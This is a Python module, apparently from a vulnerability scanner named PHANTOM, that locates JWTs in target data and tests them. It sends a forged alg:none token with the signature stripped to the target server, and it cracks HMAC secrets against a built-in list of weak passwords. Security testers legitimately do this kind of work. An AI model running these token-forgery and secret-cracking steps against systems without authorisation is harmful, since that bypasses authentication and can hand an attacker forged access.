"""
PHANTOM — JWT Token Analysis Module

Detection:
1. Find JWT tokens in cookies and Authorization headers
2. Decode JWT (base64) without verification to read payload
3. Check header alg: if "none" or "None" — report vuln
4. Check if token accepts alg:none (send modified token)
5. Check for weak HMAC secret (try common secrets)
"""
from __future__ import annotations

import base64
import json
import re
import hmac
import hashlib
from urllib.parse import urlparse

from core.target import Target, VulnFinding
from core.findings import Finding, FindingsDB
from core.engine import PhantomEngine
from core.config import PhantomConfig
from utils.http_client import request, Response


class JWTCheck:
    """JWT token discovery, decoding, and vulnerability analysis."""

    def __init__(self, engine: PhantomEngine):
        self.engine = engine
        self.target = engine.target

    # Common weak secrets to test
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "token",
        "key", "changeme", "test", "supersecret", "pass",
        "jwt_secret", "secretkey", "private", "qwerty",
        "12345", "letmein", "monkey", "mypass", "mysecret",
    ]

    def run(self):
        """Find and analyze JWT tokens from target data."""
        print("[*] Starting JWT analysis...")
        findings = 0

        tokens = self._find_tokens()
        if not tokens:
            print("  [!] No JWT tokens found in target data")
            return

        print(f"  [*] Found {len(tokens)} JWT token(s) to analyze")

        for token in set(tokens):
            try:
                if self._analyze_token(token):
                    findings += 1
            except Exception as e:
                print(f"  [!] JWT analysis error: {e}")
                continue

        print(f"  [+] JWT analysis complete — {findings} finding(s)")

    # ── Token discovery ─────────────────────────────────────────────

    def _find_tokens(self) -> list[str]:
        """Search all target data for JWT tokens."""
        tokens = []
        text_sources = []

        # Add URL sources
        for d in list(self.target.directories + self.target.js_endpoints):
            text_sources.append(d)

        # Add any captured headers from target notes
        notes = self.target.notes or {}
        for key, val in notes.items():
            if isinstance(val, str):
                text_sources.append(val)
            elif isinstance(val, dict):
                for v in val.values():
                    if isinstance(v, str):
                        text_sources.append(v)

        # Add subdomains and DNS records
        for sub in self.target.subdomains:
            text_sources.append(sub.subdomain)

        # Extract JWT using regex
        # JWT pattern: 3 base64url segments separated by dots
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}'
        )

        for text in text_sources:
            if not text:
                continue
            for match in jwt_pattern.finditer(text):
                token = match.group()
                if token not in tokens:
                    tokens.append(token)

        return tokens

    # ── Token analysis ──────────────────────────────────────────────

    def _analyze_token(self, token: str) -> bool:
        """Decode and analyze a JWT token for vulnerabilities."""
        found = False
        parts = token.split(".")

        if len(parts) != 3:
            return False

        # Decode header
        header_b64 = self._pad_b64(parts[0])
        try:
            header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
        except Exception:
            return False

        # Decode payload
        payload_b64 = self._pad_b64(parts[1])
        try:
            payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
        except Exception:
            payload = {}

        alg = header.get("alg", "")

        # ── Check 1: alg=none ───────────────────────────────────────
        if alg.lower() == "none" or alg == "None":
            self.engine.findings.add(Finding(
                name="JWT Algorithm Confusion (alg=none)",
                severity="CRITICAL",
                url=self.target.domain,
                param="JWT",
                payload=token[:80] + "...",
                evidence=f"Algorithm set to '{alg}' — signature verification bypass possible",
                phase="vuln",
            ))
            print(f"  [+] JWT alg=none vulnerability found!")
            found = True

        # ── Check 2: Empty signature with alg=none modification ────
        # Create a modified token with alg: none and empty sig
        modified_header = {"alg": "none", "typ": "JWT"}
        new_header_b64 = self._b64encode(json.dumps(modified_header))
        sigless_token = f"{new_header_b64}.{parts[1]}."

        try:
            resp = request(
                self.target.domain if self.target.domain.startswith("http")
                else f"https://{self.target.domain}",
                headers={"Authorization": f"Bearer {sigless_token}"},
                timeout=8,
            )
            if resp and resp.status == 200:
                self.engine.findings.add(Finding(
                    name="JWT Signature Bypass (alg:none works)",
                    severity="CRITICAL",
                    url=self.target.domain,
                    param="JWT",
                    payload=sigless_token[:80],
                    evidence=f"Server accepted token with alg:none (HTTP {resp.status})",
                    phase="vuln",
                ))
                print(f"  [+] JWT alg:none signature bypass confirmed!")
                found = True
        except Exception:
            pass

        # ── Check 3: Weak HMAC secret ──────────────────────────────
        if alg.lower().startswith("hs"):
            for secret in self.WEAK_SECRETS:
                try:
                    sig = self._sign_hs(parts[0] + "." + parts[1], secret, alg)
                    if sig == parts[2]:
                        self.engine.findings.add(Finding(
                            name="JWT Weak HMAC Secret",
                            severity="CRITICAL",
                            url=self.target.domain,
                            param="JWT",
                            payload=f"secret={secret}",
                            evidence=f"Cracked HMAC secret: '{secret}' — full token forgery possible",
                            phase="vuln",
                        ))
                        print(f"  [+] JWT weak secret cracked: '{secret}'")
                        found = True
                        break
                except Exception:
                    continue

        # ── Check 4: Sensitive info in payload ──────────────────────
        sensitive_keys = ["password", "secret", "token", "key",
                          "credit", "ssn", "phone", "email", "role"]
        for key in sensitive_keys:
            if key in payload:
                self.engine.findings.add(Finding(
                    name="JWT Sensitive Data Exposure",
                    severity="MEDIUM",
                    url=self.target.domain,
                    param="JWT",
                    payload=f"Key '{key}' found in JWT payload",
                    evidence=json.dumps(payload, indent=2)[:300],
                    phase="vuln",
                ))
                found = True
                break

        return found

    # ── Helpers ─────────────────────────────────────────────────────

    def _pad_b64(self, s: str) -> str:
        """Add base64 padding."""
        return s + "=" * (4 - len(s) % 4) if len(s) % 4 else s

    def _b64encode(self, data: str) -> str:
        """Base64url encode without padding."""
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

    def _sign_hs(self, data: str, secret: str, alg: str) -> str:
        """Sign data with HMAC and return signature."""
        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = hash_map.get(alg.upper(), hashlib.sha256)
        sig = hmac.new(secret.encode(), data.encode(), hash_func).digest()
        return base64.urlsafe_b64encode(sig).decode().rstrip("=")
